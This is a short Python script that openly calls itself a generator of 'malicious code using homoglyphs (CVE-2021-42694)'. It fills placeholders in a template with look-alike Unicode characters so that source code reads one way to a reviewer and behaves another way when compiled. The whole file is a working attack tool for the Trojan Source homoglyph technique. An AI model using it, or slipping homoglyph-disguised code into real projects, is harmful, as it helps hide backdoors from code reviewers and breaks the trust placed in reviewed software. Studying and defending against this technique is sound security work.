#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Author:   simplylu
# Date:     02.11.2021

from random import choice, random
import argparse
import re
import os

def about():
    print("Author:  Jakob Schaffarczyk")
    print("Date:    02.11.2021")
    print("Name:    codegen.py")
    print("Version: v0.0.1")
    print("\nDescription")
    print("Generate malicious code using homoglyphs (CVE-2021-42694)")

def read_homoglyphs() -> dict:
    data = open("homoglyphs.txt", "r").readlines()
    homoglyphs = {}
    for line in data:
        key = line[0]
        values = line[1:].strip()
        homoglyphs[key] = values
    return homoglyphs

def create_payload(template: bytes, random_char: bool = False) -> bytes:
    payload = template
    homoglyphs = read_homoglyphs()
    replacements = list(set(re.findall(rb'\$.\$', template)))
    for repl in replacements:
        char = chr(repl[1])
        if random_char:
            char = choice(homoglyphs[char]).encode()
        else:
            char = homoglyphs[char][0].encode()
        payload = payload.replace(repl, char)
    return payload

def main():
    # Parse command line arguments to object `args`
    parser = argparse.ArgumentParser(description="Generate malicious code using homoglyphs (CVE-2021-42694)")
    parser.add_argument("-i", "--infile", help="Input file containing homoglyph placeholders")
    parser.add_argument("-o", "--outfile", help="Output file to store the final code")
    parser.add_argument("-r", "--random", action="store_true", help="Set flag to choose random homoglyph; take first one if not set")
    parser.add_argument("-a", "--about", action="store_true", help="Print about text")
    args = vars(parser.parse_args())

    # Print about information
    if args["about"]:
        about()
        exit(0)
    
    # Check if required parameters exist
    if not args["infile"] and not args["outfile"]:
        parser.print_usage()
        exit(0)
    if args["infile"]:
        infile = args["infile"]
    else:
        print("[!] Input file is missing")
        exit(0)
    if args["outfile"]:
        outfile = args["outfile"]
    else:
        print("[!] Output file is missing")
        exit(0)
    
    # Check if template exist
    if not os.path.exists(infile):
        print("[!] Input file does not exist")
        exit(0)
    
    # Read input file
    template = open(infile, 'rb').read()

    # Create payload by replacing homoglyph placeholders
    if args["random"]:
        payload = create_payload(template, random_char=True)
    else:
        payload = create_payload(template)
    
    # Store payload to output file
    with open(outfile, 'wb') as f:
        f.write(payload)
    

if __name__ == "__main__":
    main()
